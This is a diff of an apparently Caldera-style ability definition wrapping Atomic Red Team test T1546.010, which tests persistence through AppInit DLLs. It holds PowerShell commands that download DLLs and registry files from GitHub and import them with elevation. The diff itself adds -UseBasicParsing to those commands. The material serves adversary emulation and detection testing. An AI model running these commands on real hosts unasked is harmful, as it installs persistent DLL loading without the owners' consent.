@@ -23,14 +23,15 @@
           = [Net.SecurityProtocolType]::Tls12; New-Item -Type Directory (split-path
           "PathToAtomicsFolder\T1546.010\src\T1546.010.reg") -ErrorAction ignore |
           Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/src/T1546.010.reg"
-          -OutFile "PathToAtomicsFolder\T1546.010\src\T1546.010.reg"; Invoke-WebRequest
-          "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/src/T1546.010-cleanup.reg"
-          -OutFile "PathToAtomicsFolder\T1546.010\src\T1546.010-cleanup.reg"; fi;
-          if ((Test-Path c:\Tools\T1546.010.dll) -and (Test-Path c:\Tools\T1546.010x86.dll))
+          -OutFile "PathToAtomicsFolder\T1546.010\src\T1546.010.reg" -UseBasicParsing;
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/src/T1546.010-cleanup.reg"
+          -OutFile "PathToAtomicsFolder\T1546.010\src\T1546.010-cleanup.reg" -UseBasicParsing;
+          fi; if ((Test-Path c:\Tools\T1546.010.dll) -and (Test-Path c:\Tools\T1546.010x86.dll))
           {exit 0} else {exit 1}; then : ; else New-Item -Type Directory C:\Tools
           -ErrorAction ignore | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/bin/T1546.010.dll"
-          -OutFile C:\Tools\T1546.010.dll; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/bin/T1546.010x86.dll"
-          -OutFile C:\Tools\T1546.010x86.dll; fi; reg.exe import "PathToAtomicsFolder\T1546.010\src\T1546.010.reg"'
+          -OutFile C:\Tools\T1546.010.dll -UseBasicParsing; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/bin/T1546.010x86.dll"
+          -OutFile C:\Tools\T1546.010x86.dll -UseBasicParsing; fi; reg.exe import
+          "PathToAtomicsFolder\T1546.010\src\T1546.010.reg"'
         cleanup: reg.exe import "#{registry_cleanup_file}" >nul 2>&1
         elevation_required: true
   plugin: atomic
@@ -39,9 +40,9 @@
   delete_payload: false
   privilege: ''
   buckets:
-  - t1546.010
-  - atomic-red-team
   - persistence
+  - atomic-red-team
+  - t1546.010
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -68,10 +69,10 @@
         | Out-Null
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/src/T1546.010.reg"
-        -OutFile "#{registry_file}"
+        -OutFile "#{registry_file}" -UseBasicParsing
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/src/T1546.010-cleanup.reg"
-        -OutFile "#{registry_cleanup_file}"
+        -OutFile "#{registry_cleanup_file}" -UseBasicParsing
 
         '
     - description: 'DLL''s must exist in the C:\Tools directory (T1546.010.dll and
@@ -86,12 +87,12 @@
         Out-Null
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/bin/T1546.010.dll"
-        -OutFile C:\Tools\T1546.010.dll
+        -OutFile C:\Tools\T1546.010.dll -UseBasicParsing
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/bin/T1546.010x86.dll"
-        -OutFile C:\Tools\T1546.010x86.dll
+        -OutFile C:\Tools\T1546.010x86.dll -UseBasicParsing
 
         '
     technique_created: '2020-01-24T14:52:25.589Z'
     atomic_guid: a58d9386-3080-4242-ab5f-454c16503d18
-    import_timestamp: '2026-10-20T07:08:29.041619Z'
+    import_timestamp: '2026-10-21T07:01:51.106582Z'
